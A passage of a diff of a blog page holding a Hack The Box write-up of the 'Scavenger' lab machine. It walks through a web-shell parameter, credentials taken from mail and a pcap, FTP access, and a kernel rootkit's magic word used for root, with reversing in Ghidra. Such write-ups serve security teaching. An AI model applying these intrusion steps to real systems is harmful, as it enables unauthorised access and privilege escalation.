+</span></span><span class="line"><span class="cl">hidden                  <span class="o">[</span>Status: 200, Size: 61, Words: 3, Lines: 2<span class="o">]</span>                                                                                   
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>From here I got <code>hidden</code> as parameter and got <code>ib01c03</code> as output in browser. This indicated I can now run commands from the browser. You can see the output below.</p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="public/images/shell_page.png"
-        data-srcset="/scavenger/public/images/shell_page.png, public/images/shell_page.png 1.5x, /scavenger/public/images/shell_page.png 2x"
+        data-src="/scavenger/public/images/shell_page.png"
+        data-srcset="/scavenger/public/images/shell_page.png, /scavenger/public/images/shell_page.png 1.5x, /scavenger/public/images/shell_page.png 2x"
         data-sizes="auto"
         alt="/scavenger/public/images/shell_page.png"
-        title="shell_page" /></p>
+        title="shell_page" width="897" height="540" /></p>
 <h2 id="rce-as-ib01c03">RCE as ib01c03</h2>
 <h3 id="users-ib01c03-ib01ftp-ib01c01">Users: ib01c03-&gt;ib01ftp-&gt;ib01c01</h3>
 <p>After getting web-shell I searched every possible part of that user and finally got mail in <code>/var/mail/</code> directory i.e. <code>ib01c03</code> with my <code>cat</code> I got this</p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="public/images/credentials.png"
-        data-srcset="/scavenger/public/images/credentials.png, public/images/credentials.png 1.5x, /scavenger/public/images/credentials.png 2x"
+        data-src="/scavenger/public/images/credentials.png"
+        data-srcset="/scavenger/public/images/credentials.png, /scavenger/public/images/credentials.png 1.5x, /scavenger/public/images/credentials.png 2x"
         data-sizes="auto"
         alt="/scavenger/public/images/credentials.png"
-        title="credentials" /></p>
+        title="credentials" width="1351" height="540" /></p>
 <p>You can see the credentials username/password. I used that user/pass
 to login ftp and I m into ib01ftp user now.</p>
 <h3 id="ftp">FTP</h3>
 <p><em><strong>ib01ftp-&gt;ib01c01-&gt;user.txt</strong></em></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -691,22 +632,22 @@ to login ftp and I m into ib01ftp user now.</p>
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">root@gr4n173:~$ ftp www.supersechosting.htb
-Connected to www.supersechosting.htb.
-220 (vsFTPd 3.0.3)
-Name (www.supersechosting.htb:bikram): ib01ftp
-331 Please specify the password.
-Password:
-230 Login successful.
-Remote system type is UNIX.
-Using binary mode to transfer files.
-ftp&gt; ls
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">root@gr4n173:~$ ftp www.supersechosting.htb
+</span></span><span class="line"><span class="cl">Connected to www.supersechosting.htb.
+</span></span><span class="line"><span class="cl">220 (vsFTPd 3.0.3)
+</span></span><span class="line"><span class="cl">Name (www.supersechosting.htb:bikram): ib01ftp
+</span></span><span class="line"><span class="cl">331 Please specify the password.
+</span></span><span class="line"><span class="cl">Password:
+</span></span><span class="line"><span class="cl">230 Login successful.
+</span></span><span class="line"><span class="cl">Remote system type is UNIX.
+</span></span><span class="line"><span class="cl">Using binary mode to transfer files.
+</span></span><span class="line"><span class="cl">ftp&gt; ls
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>After alot searched in every directory I got <code>incidents</code> and <code>ibo1c01_incident.pcap</code> file inside <code>ib01c01</code>. Then downloaded it to my local machine for that I used below command.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -714,37 +655,35 @@ ftp&gt; ls
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">ftp&gt; get ib01c01_incident.pcap
-local: ib01c01_incident.pcap remote: ib01c01_incident.pcap
-200 PORT command successful. Consider using PASV.
-150 Opening BINARY mode data connection for ib01c01_incident.pcap (835084 bytes).
-226 Transfer complete.
-835084 bytes received in 6.58 secs (123.9393 kB/s)
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ftp&gt; get ib01c01_incident.pcap
+</span></span><span class="line"><span class="cl">local: ib01c01_incident.pcap remote: ib01c01_incident.pcap
+</span></span><span class="line"><span class="cl">200 PORT command successful. Consider using PASV.
+</span></span><span class="line"><span class="cl">150 Opening BINARY mode data connection for ib01c01_incident.pcap (835084 bytes).
+</span></span><span class="line"><span class="cl">226 Transfer complete.
+</span></span><span class="line"><span class="cl">835084 bytes received in 6.58 secs (123.9393 kB/s)
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>You can get .pcap file here: <a href="/scavenger/public/files/ib01c01_incident.pcap" rel="">pcap</a>. It would be a great idea if we try strings for .pcap file so I analyzed .pcap file with <code>strings</code> and got this result.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
-</span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">root@gr4n173:~$ strings ib01c01_incident.pcap | grep passwd
-ajax=1&amp;token=&amp;controller=AdminLogin&amp;submitLogin=1&amp;passwd=pwnhats.htb&amp;email=admin%40pwnhats.htb&amp;redirect=http%3A%2F%2Fwww.pwnhats.htb%2Fadmin530o6uisg%2F%26token%3De44d0ae2213d01986912abc63712a05b
-                                                &lt;label class=&#34;control-label&#34; for=&#34;passwd&#34;&gt;
-                                                &lt;input name=&#34;passwd&#34; type=&#34;password&#34; id=&#34;passwd&#34; class=&#34;form-control&#34; value=&#34;&#34; tabindex=&#34;2&#34; placeholder=&#34;&amp;#xf084 Password&#34; /&gt;
-ajax=1&amp;token=&amp;controller=AdminLogin&amp;submitLogin=1&amp;passwd=GetYouAH4t%21&amp;email=pwnhats%40pwnhats.htb&amp;redirect=http%3a//www.pwnhats.htb/admin530o6uisg/%26token%3de44d0ae2213d01986912abc63712a05b
-
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">root@gr4n173:~$ strings ib01c01_incident.pcap | grep passwd
+</span></span><span class="line"><span class="cl">ajax=1&amp;token=&amp;controller=AdminLogin&amp;submitLogin=1&amp;passwd=pwnhats.htb&amp;email=admin%40pwnhats.htb&amp;redirect=http%3A%2F%2Fwww.pwnhats.htb%2Fadmin530o6uisg%2F%26token%3De44d0ae2213d01986912abc63712a05b
+</span></span><span class="line"><span class="cl">                                                &lt;label class=&#34;control-label&#34; for=&#34;passwd&#34;&gt;
+</span></span><span class="line"><span class="cl">                                                &lt;input name=&#34;passwd&#34; type=&#34;password&#34; id=&#34;passwd&#34; class=&#34;form-control&#34; value=&#34;&#34; tabindex=&#34;2&#34; placeholder=&#34;&amp;#xf084 Password&#34; /&gt;
+</span></span><span class="line"><span class="cl">ajax=1&amp;token=&amp;controller=AdminLogin&amp;submitLogin=1&amp;passwd=GetYouAH4t%21&amp;email=pwnhats%40pwnhats.htb&amp;redirect=http%3a//www.pwnhats.htb/admin530o6uisg/%26token%3de44d0ae2213d01986912abc63712a05b
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>From here I got passwd <code>GetYouAH4t%21</code> where <code>%21=!</code> so <code>GetYouAH4t!</code>. So basically we had to give a try any commands for any file. I  tried this passin every user which I got from ftp</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -755,46 +694,46 @@ ajax=1&amp;token=&amp;controller=AdminLogin&amp;submitLogin=1&amp;passwd=GetYouA
 </span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">ftp&gt; ls
-200 PORT command successful. Consider using PASV.
-150 Here comes the directory listing.
-drwx------    5 1001     1004         4096 Feb 28 06:23 ib01c01
-drwx------    3 1002     1004         4096 Dec 11  2018 ib01c02
-drwx------    4 1003     1004         4096 Jan 30  2019 ib01c03
-dr-xrwx---    3 1005     1000         4096 Dec 10  2018 ib01ftp
-drwx------    3 1004     1000         4096 Dec 10  2018 ib01www
-drwx------    2 1000     1000         4096 Feb 02  2019 support
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ftp&gt; ls
+</span></span><span class="line"><span class="cl">200 PORT command successful. Consider using PASV.
+</span></span><span class="line"><span class="cl">150 Here comes the directory listing.
+</span></span><span class="line"><span class="cl">drwx------    5 1001     1004         4096 Feb 28 06:23 ib01c01
+</span></span><span class="line"><span class="cl">drwx------    3 1002     1004         4096 Dec 11  2018 ib01c02
+</span></span><span class="line"><span class="cl">drwx------    4 1003     1004         4096 Jan 30  2019 ib01c03
+</span></span><span class="line"><span class="cl">dr-xrwx---    3 1005     1000         4096 Dec 10  2018 ib01ftp
+</span></span><span class="line"><span class="cl">drwx------    3 1004     1000         4096 Dec 10  2018 ib01www
+</span></span><span class="line"><span class="cl">drwx------    2 1000     1000         4096 Feb 02  2019 support
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Finally I m into <code>ib01c01</code> user on <code>ls</code> I got user.txt and downloaded to my local machine using <code>get</code></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">ftp&gt; get user.txt 
-local: user.txt remote: user.txt
-No control connection for command: Success
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ftp&gt; get user.txt 
+</span></span><span class="line"><span class="cl">local: user.txt remote: user.txt
+</span></span><span class="line"><span class="cl">No control connection for command: Success
+</span></span></code></pre></td></tr></table>
 </div>
 </div><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">root@gr4n173:~$ cat user.txt
-6f8a8a************
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">root@gr4n173:~$ cat user.txt
+</span></span><span class="line"><span class="cl">6f8a8a************
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>This way I got the user.txt file without getting shell for user.</p>
 <h1 id="unprivelege--privilege-escalation">Unprivelege-&gt; Privilege Escalation</h1>
 <p><strong>ftp-&gt;ib01c01-&gt;.pcap</strong></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -813,59 +752,59 @@ No control connection for command: Success
 </span><span class="lnt">17
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">root@gr4n173:~$ ftp www.supersechosting.htb
-Connected to www.supersechosting.htb.
-220 (vsFTPd 3.0.3)
-Name (www.supersechosting.htb:bikram): ib01c01
-331 Please specify the password.
-Password:
-230 Login successful.
-Remote system type is UNIX.
-Using binary mode to transfer files.
-ftp&gt; ls
-200 PORT command successful. Consider using PASV.
-150 Here comes the directory listing.
--rw-------    1 1001     1004           32 Jan 30  2019 access.txt
--rw-r--r--    1 1001     1004     68175351 Dec 07  2018 prestashop_1.7.4.4.zip
--rw-r-----    1 0        1004           33 Dec 07  2018 user.txt
-drwxr-xr-x   26 1001     1004         4096 Dec 10  2018 www
-226 Directory send OK.
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">root@gr4n173:~$ ftp www.supersechosting.htb
+</span></span><span class="line"><span class="cl">Connected to www.supersechosting.htb.
+</span></span><span class="line"><span class="cl">220 (vsFTPd 3.0.3)
+</span></span><span class="line"><span class="cl">Name (www.supersechosting.htb:bikram): ib01c01
+</span></span><span class="line"><span class="cl">331 Please specify the password.
+</span></span><span class="line"><span class="cl">Password:
+</span></span><span class="line"><span class="cl">230 Login successful.
+</span></span><span class="line"><span class="cl">Remote system type is UNIX.
+</span></span><span class="line"><span class="cl">Using binary mode to transfer files.
+</span></span><span class="line"><span class="cl">ftp&gt; ls
+</span></span><span class="line"><span class="cl">200 PORT command successful. Consider using PASV.
+</span></span><span class="line"><span class="cl">150 Here comes the directory listing.
+</span></span><span class="line"><span class="cl">-rw-------    1 1001     1004           32 Jan 30  2019 access.txt
+</span></span><span class="line"><span class="cl">-rw-r--r--    1 1001     1004     68175351 Dec 07  2018 prestashop_1.7.4.4.zip
+</span></span><span class="line"><span class="cl">-rw-r-----    1 0        1004           33 Dec 07  2018 user.txt
+</span></span><span class="line"><span class="cl">drwxr-xr-x   26 1001     1004         4096 Dec 10  2018 www
+</span></span><span class="line"><span class="cl">226 Directory send OK.
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>While doing enumeration it would be better if you analyze/use the files which was found before. So I analyzed .pcap file with wireshark and got file root.c .</p>
 <p><em>Wireshark: File-&gt;Export Objects-&gt;HTTP</em></p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="public/images/incident_pcapfile.png"
-        data-srcset="/scavenger/public/images/incident_pcapfile.png, public/images/incident_pcapfile.png 1.5x, /scavenger/public/images/incident_pcapfile.png 2x"
+        data-src="/scavenger/public/images/incident_pcapfile.png"
+        data-srcset="/scavenger/public/images/incident_pcapfile.png, /scavenger/public/images/incident_pcapfile.png 1.5x, /scavenger/public/images/incident_pcapfile.png 2x"
         data-sizes="auto"
         alt="/scavenger/public/images/incident_pcapfile.png"
-        title="incident_pcapfile" /></p>
+        title="incident_pcapfile" width="1372" height="740" /></p>
 <p>Then, I downloaded it in my local machine. You can get file here <a href="/public/files/root.c" rel="">root.c</a>. After analyzing this file I noticed that it is Kernel Rootkit. There is a saying</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">&#34;Some people say that there are three things you have to do before you die: Write a book, have a child and plant a tree&#34;
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#34;Some people say that there are three things you have to do before you die: Write a book, have a child and plant a tree&#34;
+</span></span></code></pre></td></tr></table>
 </div>
-</div><p>and found really good source for it you can visit here: <a href="https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485" target="_blank" rel="noopener noreffer">detail</a>.</p>
+</div><p>and found really good source for it you can visit here: <a href="https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485" target="_blank" rel="noopener noreffer ">detail</a>.</p>
 <p><strong>LKM-&gt; &lsquo;magic&rsquo;-&gt; Root</strong></p>
 <p>After reading above blog I noticed that I should had <code>root.ko</code> file and a word <code>magic</code>. At first, I searched for word magic in root.c file and got <code>g0tR0ot</code>. I tried with that word in browser from previous user <code>ib01c03</code>with payload as
 <img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="public/images/lkm_rootkit.png"
-        data-srcset="/scavenger/public/images/lkm_rootkit.png, public/images/lkm_rootkit.png 1.5x, /scavenger/public/images/lkm_rootkit.png 2x"
+        data-src="/scavenger/public/images/lkm_rootkit.png"
+        data-srcset="/scavenger/public/images/lkm_rootkit.png, /scavenger/public/images/lkm_rootkit.png 1.5x, /scavenger/public/images/lkm_rootkit.png 2x"
         data-sizes="auto"
         alt="/scavenger/public/images/lkm_rootkit.png"
-        title="lkm_rootkit" />
+        title="lkm_rootkit" width="943" height="539" />
 and got same user so word <code>magic</code> was changed. For that I searched that word in every part of home dir of <code>ib01c01</code> and found <code>old school way of hidding a files </code> on <code>ls -al</code> I got this.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -879,132 +818,128 @@ and got same user so word <code>magic</code> was changed. For that I searched th
 </span><span class="lnt">12
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">ftp&gt; ls -al
-200 PORT command successful. Consider using PASV.
-150 Here comes the directory listing.
-drwx------    5 1001     1004         4096 Feb 28 06:23 .
-drwxr-xr-x    8 0        0            4096 Dec 07  2018 ..
-drwxr-xr-x    2 1001     1004         4096 Feb 02  2019 ...
--rw-------    1 0        0               0 Dec 11  2018 .bash_history
-drwx------    2 1001     1004         4096 Feb 28 06:23 .ssh
--rw-------    1 1001     1004           32 Jan 30  2019 access.txt
--rw-r--r--    1 1001     1004     68175351 Dec 07  2018 prestashop_1.7.4.4.zip
--rw-r-----    1 0        1004           33 Dec 07  2018 user.txt
-drwxr-xr-x   26 1001     1004         4096 Dec 10  2018 www
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ftp&gt; ls -al
+</span></span><span class="line"><span class="cl">200 PORT command successful. Consider using PASV.
+</span></span><span class="line"><span class="cl">150 Here comes the directory listing.
+</span></span><span class="line"><span class="cl">drwx------    5 1001     1004         4096 Feb 28 06:23 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x    8 0        0            4096 Dec 07  2018 ..
+</span></span><span class="line"><span class="cl">drwxr-xr-x    2 1001     1004         4096 Feb 02  2019 ...
+</span></span><span class="line"><span class="cl">-rw-------    1 0        0               0 Dec 11  2018 .bash_history
+</span></span><span class="line"><span class="cl">drwx------    2 1001     1004         4096 Feb 28 06:23 .ssh
+</span></span><span class="line"><span class="cl">-rw-------    1 1001     1004           32 Jan 30  2019 access.txt
+</span></span><span class="line"><span class="cl">-rw-r--r--    1 1001     1004     68175351 Dec 07  2018 prestashop_1.7.4.4.zip
+</span></span><span class="line"><span class="cl">-rw-r-----    1 0        1004           33 Dec 07  2018 user.txt
+</span></span><span class="line"><span class="cl">drwxr-xr-x   26 1001     1004         4096 Dec 10  2018 www
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>There I noticed <code>...</code> directory where I found <code>root.ko</code> file
 and downloaded it to my local machine using command as previous. Since <code>root.ko</code> file was ELF file so I tried simple <code>head</code> command as</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span><span class="lnt">6
 </span><span class="lnt">7
-</span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">root@gr4n174:~$ head -n1 root.ko
-ELF&gt;@@&amp;%GNUœ-ME&lt;_|1HATUHzSI@HH eH%(HD$1Hg0tR0otD$g3tD$
-                                                      Pr1vHD$D$Hu,HHHL$eH3
-                                                                       %(H []A\H1HHLHLD$
-                                                                                           HL$H|$Ht$HuiHItiHADAD$LAD$AD$AD$AD$
-D$ AD$HH1H11IHyHHHHHH=Hv-=H1HtHH=11I1H=Hv7H==H1H5H=H=H==H1HttyRK: 
-Cannot prepare credentials 
-
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">root@gr4n174:~$ head -n1 root.ko
+</span></span><span class="line"><span class="cl">ELF&gt;@@&amp;%GNUœ-ME&lt;_|1HATUHzSI@HH eH%(HD$1Hg0tR0otD$g3tD$
+</span></span><span class="line"><span class="cl">                                                      Pr1vHD$D$Hu,HHHL$eH3
+</span></span><span class="line"><span class="cl">                                                                       %(H []A\H1HHLHLD$
+</span></span><span class="line"><span class="cl">                                                                                           HL$H|$Ht$HuiHItiHADAD$LAD$AD$AD$AD$
+</span></span><span class="line"><span class="cl">D$ AD$HH1H11IHyHHHHHH=Hv-=H1HtHH=11I1H=Hv7H==H1H5H=H=H==H1HttyRK: 
+</span></span><span class="line"><span class="cl">Cannot prepare credentials 
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>From here I got two word <code>g0tR0ot</code> and <code>g3tPr1v</code> since first word was <code>magic</code> word from root.c but second one wasn&rsquo;t from there so I tried that word and luckly got the root.</p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="public/images/root_magic.png"
-        data-srcset="/scavenger/public/images/root_magic.png, public/images/root_magic.png 1.5x, /scavenger/public/images/root_magic.png 2x"
+        data-src="/scavenger/public/images/root_magic.png"
+        data-srcset="/scavenger/public/images/root_magic.png, /scavenger/public/images/root_magic.png 1.5x, /scavenger/public/images/root_magic.png 2x"
         data-sizes="auto"
         alt="/scavenger/public/images/root_magic.png"
-        title="root_magic" /></p>
+        title="root_magic" width="953" height="540" /></p>
 <p>Now I can read root.txt file as</p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="public/images/root_txt.jpg"
-        data-srcset="/scavenger/public/images/root_txt.jpg, public/images/root_txt.jpg 1.5x, /scavenger/public/images/root_txt.jpg 2x"
+        data-src="/scavenger/public/images/root_txt.jpg"
+        data-srcset="/scavenger/public/images/root_txt.jpg, /scavenger/public/images/root_txt.jpg 1.5x, /scavenger/public/images/root_txt.jpg 2x"
         data-sizes="auto"
         alt="/scavenger/public/images/root_txt.jpg"
-        title="root_txt" /></p>
+        title="root_txt" width="945" height="540" /></p>
 <hr>
 <h2 id="alternative-method-to-root">Alternative Method to Root</h2>
 <h3 id="reverse-engineering">Reverse Engineering</h3>
-<p>Though I got the root from simple way and I tried other way to get root. As <code>root.ko</code> file was ELF file and I love reversing the ELF file so I analyzed using my latest favorite tool <code>ghidra</code>. I opened it using <code>ghidra</code> if you are unfamiliar with <code>ghidra </code> tool you can see more about it here: <a href="https://www.ghidra-sre.org/" target="_blank" rel="noopener noreffer">ghidra</a>.</p>
+<p>Though I got the root from simple way and I tried other way to get root. As <code>root.ko</code> file was ELF file and I love reversing the ELF file so I analyzed using my latest favorite tool <code>ghidra</code>. I opened it using <code>ghidra</code> if you are unfamiliar with <code>ghidra </code> tool you can see more about it here: <a href="https://www.ghidra-sre.org/" target="_blank" rel="noopener noreffer ">ghidra</a>.</p>
 <p>From the analysis of file root.c word <code>magic</code> was in function <code>root_write()</code>. So I checked that function in <code>ghidra</code> and got below as result.</p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="public/images/root_write.png"
-        data-srcset="/scavenger/public/images/root_write.png, public/images/root_write.png 1.5x, /scavenger/public/images/root_write.png 2x"
+        data-src="/scavenger/public/images/root_write.png"
+        data-srcset="/scavenger/public/images/root_write.png, /scavenger/public/images/root_write.png 1.5x, /scavenger/public/images/root_write.png 2x"
         data-sizes="auto"
         alt="/scavenger/public/images/root_write.png"
-        title="root_write" /></p>
+        title="root_write" width="1346" height="731" /></p>
 <p>There I saw three variables as <code>local_31</code> <code>local_2d</code> <code>local_28</code> which was defined already. But these variable was defined in <code>little Indian</code> format. If you are unfamiliar with this format then don&rsquo;t worry I will explain in my next blog.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">  local_31 = 0x743367; # g3t
-  local_2d = 0x76317250; # Pr1v
-  local_28 = 0x746f3052743067; # g0tR0ot
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">  local_31 = 0x743367; # g3t
+</span></span><span class="line"><span class="cl">  local_2d = 0x76317250; # Pr1v
+</span></span><span class="line"><span class="cl">  local_28 = 0x746f3052743067; # g0tR0ot
+</span></span></code></pre></td></tr></table>
 </div>
-</div><p>And on analyzing more about that function I got something fishy in <code>snprintf((char *)&amp;local_28,8,&quot;%s%s&quot;,&amp;local_31,&amp;local_2d);</code>. In the above function from <code>ghidra</code> I found that value of <code>local_28</code> is replaced with <code>local_31+local_2d</code>. If you are unfamiliar about <code>snprintf</code> function you can visit here <a href="http://joequery.me/code/snprintf-c/" target="_blank" rel="noopener noreffer">snprintf</a>.</p>
+</div><p>And on analyzing more about that function I got something fishy in <code>snprintf((char *)&amp;local_28,8,&quot;%s%s&quot;,&amp;local_31,&amp;local_2d);</code>. In the above function from <code>ghidra</code> I found that value of <code>local_28</code> is replaced with <code>local_31+local_2d</code>. If you are unfamiliar about <code>snprintf</code> function you can visit here <a href="http://joequery.me/code/snprintf-c/" target="_blank" rel="noopener noreffer ">snprintf</a>.</p>
 <p>So my final <code>magic</code> word was <code>g3tPr1v</code>. Using this as above in browser, I  got the root.txt file.</p>
 <p>This way I got the root of scavenger box and learned alot from this box. So I would like to thank creator of this box <code>ompamo</code> for such an awesome box. Especially enumeration, enumeration and enumeration was awesome.</p>
 <p>I will be posting writeup of next box after box retired. I would like to Thank readers for being with me through out this writeup.<br>
 Feedback are really appreciated !!<br>
 Tweet about this writeup if you like.</p>
-<p>You can see more blog at my medium here: <a href="https://medium.com/@gr4n173" target="_blank" rel="noopener noreffer">gr4n173</a>.</p></div><div class="post-footer" id="post-footer">
+<p>You can see more blog at my medium here: <a href="https://medium.com/@gr4n173" target="_blank" rel="noopener noreffer ">gr4n173</a>.</p></div><div class="post-footer" id="post-footer">
     <div class="post-info">
         <div class="post-info-line">
             <div class="post-info-mod">
                 <span>Updated on 2020-02-29</span>
-            </div>
-            <div class="post-info-license"></div>
-        </div>
+            </div></div>
         <div class="post-info-line">
             <div class="post-info-md"><span>
                             <a class="link-to-markdown" href="/scavenger/index.md" target="_blank">Read Markdown</a>
                         </span></div>
             <div class="post-info-share">
-                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://example.com/scavenger/" data-title="Scavenger" data-via="gr4n173" data-hashtags="linux,htb,ftp,sqli,RE,lkm,whois,pcap,ffuf,fuzz"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://example.com/scavenger/" data-hashtag="linux"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://example.com/scavenger/" data-title="Scavenger"><i class="fab fa-hacker-news fa-fw"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://example.com/scavenger/" data-title="Scavenger"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@2.14.0/icons/line.svg"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://example.com/scavenger/" data-title="Scavenger"><i class="fab fa-weibo fa-fw"></i></a></span>
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://example.com/scavenger/" data-title="Scavenger" data-via="gr4n173" data-hashtags="linux,htb,ftp,sqli,RE,lkm,whois,pcap,ffuf,fuzz"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://example.com/scavenger/" data-hashtag="linux"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://example.com/scavenger/" data-title="Scavenger"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://example.com/scavenger/" data-title="Scavenger"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://example.com/scavenger/" data-title="Scavenger"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
             </div>
         </div>
     </div>
 
     <div class="post-info-more">
